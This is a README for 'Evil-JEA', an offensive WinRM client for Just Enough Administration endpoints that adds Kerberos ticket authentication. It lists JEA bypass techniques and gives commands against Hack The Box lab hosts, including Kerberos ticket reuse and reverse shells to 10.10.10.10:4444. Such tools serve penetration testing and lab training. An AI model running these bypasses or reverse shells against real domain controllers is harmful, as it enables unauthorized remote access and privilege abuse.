# Evil-JEA (Kerberos Edition)

A powerful WinRM client designed for interacting with JEA endpoints from Linux, now with **Kerberos ticket authentication** support.

## Features

- ✅ NTLM authentication (username/password)
- ✅ **Kerberos ticket authentication** (NEW!)
- ✅ Cross-domain trust support
- ✅ JEA bypass techniques (call/function operators)
- ✅ Reverse shell capabilities

## Installation

### Using uv (Recommended)

```bash
uv tool install --with pypsrp[kerberos] git+https://github.com/boboaung1337/evil-jea.git
```

### From Source (Recommended for Kerberos support)

```bash
git clone https://github.com/boboaung1337/evil-jea
cd evil-jea
make install
make build
```

# Install system dependencies for Kerberos
```bash
sudo apt-get install -y libkrb5-dev 
```
# Install Python dependencies
```bash
pip install gssapi krb5 pypsrp
```
# Connect with Kerberos ticket


```bash
# Method 1: Use environment variable
export KRB5CCNAME=/path/to/your/ticket.ccache
export KRB5_CONFIG=./krb5.conf

evil-jea connect "" "" dc1.ping.htb --kerberos

# Method 2: Specify ccache file directly
evil-jea connect "" "" dc1.ping.htb --kerberos --ccache ticket.ccache

# Method 3: Run single command
evil-jea run "" "" dc1.ping.htb --kerberos -c "whoami"

# Method 4: Reverse shell with Kerberos
evil-jea shell "" "" dc1.ping.htb 10.10.10.10 4444 --kerberos
```


```bash
evil-jea connect "" "" dc1.ping.htb --kerberos

[dc1.ping.htb]: PS> info
[dc1.ping.htb]: PS> call whoami
pong\pong_gmsa$
[dc1.ping.htb]: PS> rev_shell 10.10.10.10 4444

# Example 2: Cross-domain JEA access
export KRB5_CONFIG=./krb5.conf
export KRB5CCNAME=~/cross_domain.ccache
evil-jea connect "" "" dc2.pong.htb --kerberos

# Example 3: Non-interactive command
evil-jea run "" "" dc1.ping.htb --kerberos -c "Get-Process"

```


